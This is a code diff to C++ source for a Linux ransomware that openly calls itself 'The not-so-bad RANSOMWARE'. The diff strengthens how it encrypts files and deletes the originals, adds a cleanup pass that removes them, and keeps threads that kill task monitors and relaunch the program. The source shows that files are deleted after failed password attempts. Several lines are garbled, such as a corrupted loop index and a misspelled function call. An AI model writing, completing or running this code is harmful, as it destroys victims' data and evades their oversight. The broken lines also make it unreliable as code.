@@ -24,7 +24,7 @@
 // std::quoted() must be manual quoting, and a few syntax fix.
 //
 // You may use other compiler but make sure that your compiler
-// has one of these options.
+// is compatible with the code.
 //
 // g++ viruscurrent.cpp telelimit.cpp -o scramble -lcrypto -lcurl -std=c++17 -pthread -lstdc++fs
 #include <iostream>
@@ -91,7 +91,7 @@ void processFile(const string &inputFile, const string &outputFile, const string
     ofstream outFile(outputFile, ios::binary);
 
     if (!inFile || !outFile) {
-        cerr << "Error opening file: " << inputFile << endl;
+        cerr << "\033[1;31m[ERROR]\033[0m Error opening file: " << inputFile << endl;
         return;
     }
 
@@ -107,7 +107,7 @@ void processFile(const string &inputFile, const string &outputFile, const string
         char signature[sizeof(FILE_SIGNATURE)];
         inFile.read(signature, sizeof(FILE_SIGNATURE));
         if (strncmp(signature, FILE_SIGNATURE, sizeof(FILE_SIGNATURE)) != 0) {
-            cerr << "Invalid file signature! Skipping " << inputFile << endl;
+            cerr << "\033[1;31m[SKIP]\033[0m Invalid file signature! Skipping " << inputFile << endl;
             return;
         }
         inFile.read((char *)salt, SALT_SIZE);
@@ -135,13 +135,23 @@ void processFile(const string &inputFile, const string &outputFile, const string
     inFile.close();
     outFile.close();
 
-   // cout << (encrypt ? "Nullfied" : "Restored") << ": " << inputFile << " -> " << outputFile << endl;
+    // cout << (encrypt ? "Nullfied" : "Restored") << ": " << inputFile << " -> " << outputFile << endl;
 
-    fs::remove(inputFile);
+    // Only delete the original file after encryption is completely finished and verified
+    if (encrypt) {
+        // Verify the encrypted file was created successfully
+        if (fs::exists(outputFile) && fs::file_size(outputFile) > 0) {
+            // Only then delete the original file
+            fs::remove(inputFile);
+            cout << "\033[1;32m[OK]\033[0m Successfully encrypted and removed: " << fs::path(inputFile).filename().string() << endl;
+        } else {
+            cerr << "\033[1;31m[FAILED]\033[0m  Encryption failed for: " << inputFile << " - original file preserved" << endl;
+        }
+    }
 }
 
 void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int &counter) {
-    const int MAX_THREADS = 4; // Limit concurrent threads
+    const int MAX_THREADS = 4; // Limit concurrent threads, change the value if you want faster or slower encryption
     vector<thread> threadPool;
     mutex mtx;
     atomic<int> activeThreads(0);
@@ -194,18 +204,33 @@ void encryptAllFiles() {
     // encryptDirectory("/home", fileMap, counter);
     // to change it again into PWD, replace with 
     // encryptDirectory(fs::current_path(), fileMap, counter);
+    
+    // Final cleanup: remove any remaining original files that have been successfully encrypted
+    cout << "\033[1;33m[PROCESS]\033[0m Performing final cleanup..." << endl;
+    for (auto &pair : fileMap) {
+        string encryptedFile = pair.first;
+        string originalFile = pair.second;
+        
+        // If encrypted file exists and has content, and original file still exists, remove original
+        if (fs::exists(encryptedFile) && fs::file_size(encryptedFile) > 0 && fs::exists(originalFile)) {
+            fs::remove(originalFile);
+            cout << "\033[1;32m[OK]\033[0m Cleaned up original file: " << fs::path(originalFile).filename().string() << endl;
+        }
+    }
+    
     ofstream mapFile(MAP_FILE, ios::binary);
     for (auto &pair : fileMap) {
         mapFile << pair.first << " " << std::quoted(pair.second) << endl;
-}
+    }
 
     mapFile.close();
+    cout << "\033[1;32m[OK]\033[0m Encryption process completed!" << endl;
 }
 
 void decryptAllFiles() {
     ifstream mapFile(MAP_FILE, ios::binary);
     if (!mapFile) {
-        cout << "No file map found! Cannot restore original names." << endl;
+        cout << "\033[1;31m[ERROR]\033[0m No file map found! Cannot restore original names." << endl;
         return;
     }
 
@@ -233,7 +258,7 @@ void decryptAllFiles() {
             fs::remove(MAP_FILE);
             return;
         }
-        cout << "\033[1;33m[WARNING]\033[0m Incorrect password. Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts - 1) << endl;
+        cout << "\033[1;31m[WARNING]\033[0m Incorrect password. Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts - 1) << endl;
         attempts++;
     }
     cout << "\n\033[1;31m[SORRY]\033[0m Max password attempts reached. Sorry but we need to delete these files.\n" << endl;
@@ -324,7 +349,7 @@ void watchdog(const string& selfPath) {
                 "mate-terminal", "tilix", nullptr
             };
 
-            for (int i = 0; terms[i]; ++i) {
+            for (int i = 0; terms[itial");]; ++i) {
                 string cmd = string(terms[i]) + " -e \"" + selfPath + "\" &";
                 if (system(cmd.c_str()) == 0) break;
             }
@@ -337,19 +362,31 @@ void watchdog(const string& selfPath) {
 }
 
 void relaunchInTerminalIfDetached(const char* selfPath) {
-    if (!isatty(STDIN_FILENO)) {
-        // Write a temporary matrix effect shell script
-        const char* scriptPath = "/tmp/matrix.sh";
-        ofstream script(scriptPath);
-        script << R"(#!/bin/bash
+    // Always try to launch matrix effect, regardless of terminal status
+    cout << "\033[1;33m[PROCESS]\033[0m Launching matrix effect in new terminal..." << endl;
+    
+    // Write a temporary matrix effect shell script
+    const char* scriptPath = "/tmp/matrix.sh";
+    ofstream script(scriptPath);
+    script << R"(#!/bin/bash
+# Matrix effect script
 clear
 echo -e "\033[1;32m"
+echo "Matrix effect started..."
+
+# Get terminal dimensions with fallback
+cols=$(tput cols 2>/dev/null || echo 80)
+lines=$(tput lines 2>/dev/null || echo 24)
+
+# Matrix characters
 chars=(ｱ ｲ ｳ ｴ ｵ ｶ ｷ ｸ ｹ ｺ ｻ ｼ ｽ ｾ ｿ ﾀ ﾁ ﾂ ﾃ ﾄ ﾅ ﾆ ﾇ ﾈ ﾉ ﾊ ﾋ ﾌ ﾍ ﾎ ﾏ ﾐ ﾑ ﾒ ﾓ ﾔ ﾕ ﾖ ﾗ ﾘ ﾚ ﾛ ﾜ)
-cols=$(tput cols)
-lines=$(tput lines)
+
+# Initialize positions
 for ((i=0; i<cols; i++)); do
   pos[i]=0
 done
+
+# Main loop
 while true; do
   for ((i=0; i<cols; i++)); do
     if (( RANDOM % 100 < 10 )); then
@@ -363,24 +400,65 @@ while true; do
   sleep 0.05
 done
 )";
-        script.close();
-        chmod(scriptPath, 0755);  // Make the script executable
+    script.close();
+    
+    // Check if script was created successfully
+    if (!script.good()) {
+        cerr << "\033[1;31m[ERROR]\033[0m  Failed to create matrix script!" << endl;
+        return;
+    }
+    
+    chmod(scriptPath, 0755);  // Make the script executable
 
-        // Try launching in available terminals
-        const char* terminals[] = {
-            "x-terminal-emulator", "xterm", "gnome-terminal",
-            "konsole", "xfce4-terminal", "lxterminal",
-            "mate-terminal", "tilix", nullptr
-        };
+    // Try launching in available terminals
+    const char* terminals[] = {
+        "gnome-terminal", "xterm", "konsole", "xfce4-terminal", 
+        "lxterminal", "mate-terminal", "tilix", "x-terminal-emulator", nullptr
+    };
 
-        for (int i = 0; terminals[i]; ++i) {
-            string cmd = string(terminals[i]) + " -e \"" + scriptPath + "\" &";
-            if (system(cmd.c_str()) == 0) {
-                return;  // Terminal launched successfully
-            }
+    for (int i = 0; terminals[i]; ++i) {
+        string cmd;
+        
+        // Different terminals have different command line syntax
+        if (string(terminals[i]) == "gnome-terminal" || 
+            string(terminals[i]) == "mate-terminal" || 
+            string(terminals[i]) == "tilix") {
+            cmd = string(terminals[i]) + " -- bash -c \"" + scriptPath + "\"";
+        } else if (string(terminals[i]) == "konsole") {
+            cmd = string(terminals[i]) + " -e bash -c \"" + scriptPath + "\"";
+        } else if (string(terminals[i]) == "xfce4-terminal") {
+            cmd = string(terminals[i]) + " -e \"" + scriptPath + "\"";
+        } else {
+            // For xterm and others
+            cmd = string(terminals[i]) + " -e bash -c \"" + scriptPath + "\"";
         }
+        
+        // Execute in background so it doesn't block the main program
+        cmd += " &";
+        
+        cout << "\033[1;33m[INFO]\033[0m Trying to launch matrix in: " << terminals[i] << endl;
+        cout << "\033[1;33m[INFO]\033[0m Command: " << cmd << endl;
+        
+        int result = system(cmd.c_str());
+        if (result == 0) {
+            cout << "\033[1;32m[SUCCESS]\033[0m Successfully launched matrix effect in " << terminals[i] << endl;
+            // Give it a moment to start
+            this_thread::sleep_for(chrono::milliseconds(500));
+            return;  // Terminal launched successfully
+        } else {
+            cout << "\033[1;31m[FAIL]\033[0m Failed to launch in " << terminals[i] << " (exit code: " << result << ")" << endl;
+        }
+    }
 
-        cerr << "[!] Failed to launch matrix terminal effect!" << endl;
+    cerr << "\033[1;31m[FAIL]\033[0m Failed to launch matrix terminal effect!" << endl;
+    
+    // Fallback: try to run the script directly in background
+    string fallbackCmd = "bash " + string(scriptPath) + " &";
+    cout << "\033[1;33m[TRY]\033[0m Trying fallback method..." << endl;
+    if (system(fallbackCmd.c_str()) == 0) {
+        cout << "\033[1;33m[INFO]\033[0m Matrix effect started in background as fallback." << endl;
+    } else {
+        cerr << "\033[1;31m[FAIL]\033[0m All attempts to launch matrix effect failed!" << endl;
     }
 }
 
@@ -414,16 +492,16 @@ void installPackageIfMissing(const string &pkg) {
     string manager = detectPackageManager();
 
     if (manager == "unknown") {
-        cerr << "Unsupported package manager. Please install '" << pkg << "' manually.\n";
+        cerr << "1;31m[ERROR]\033[0m Unsupported package manager. Please install '" << pkg << "' manually.\n";
         return;
     }
 
     if (isPackageInstalled(pkg, manager)) {
-        cout << "✓ Dependency already installed: " << pkg << endl;
+        cout << "\033[1;32m[OK]\033[0m Dependency already installed: " << pkg << endl;
         return;
     }
 
-    cout << "⚙ Installing missing package: " << pkg << "...\n";
+    cout << "\033[1;33m[PROCESS]\033[0m Installing missing package: " << pkg << "...\n";
 
     string installCmd;
     if (manager == "apt")        installCmd = "sudo apt-get update && sudo apt-get install -y " + pkg;
@@ -434,9 +512,9 @@ void installPackageIfMissing(const string &pkg) {
 
     int result = system(installCmd.c_str());
     if (result != 0)
-        cerr << "❌ Failed to install package: " << pkg << endl;
+        cerr << "\033[1;31m[ERROR]\033[0m  Failed to install package: " << pkg << endl;
     else
-        cout << "✅ Installed: " << pkg << endl;
+        cout << "\033[1;32m[OK]\033[0m Installed: " << pkg << endl;
 }
 
 void checkDependencies() {
@@ -444,6 +522,7 @@ void checkDependencies() {
     installPackageIfMissing("libcurl4-openssl-dev");
     installPackageIfMissing("build-essential");
     installPackageIfMissing("acpi");
+    installPackageifMissing("xterm");
 }
 
 void sendRandomEncryptedFiles(const string &directory, int maxFiles);
@@ -480,7 +559,7 @@ if (!fs::exists(MAP_FILE)) {
     //wd.detach();
     
     thread antiMonitor(monitorAndKillTaskManagers);
-    antiMonitor.detach(); // Keeps it running in background
+    antiMonitor.detach();
 
         cout << " _____ _ _      _   _       _ _\n|  ___(_) | ___| \\ | |_   _| | | ___ _ __ \n| |_  | | |/ _ \\  \\| | | | | | |/ _ \\ '__|\n|  _| | | |  __/ |\\  | |_| | | |  __/ |   \n|_|   |_|_|\\___|_| \\_|\\__,_|_|_|\\___|_|   \nThe not-so-bad RANSOMWARE for Linux by Colton Silva\n" << endl;
 
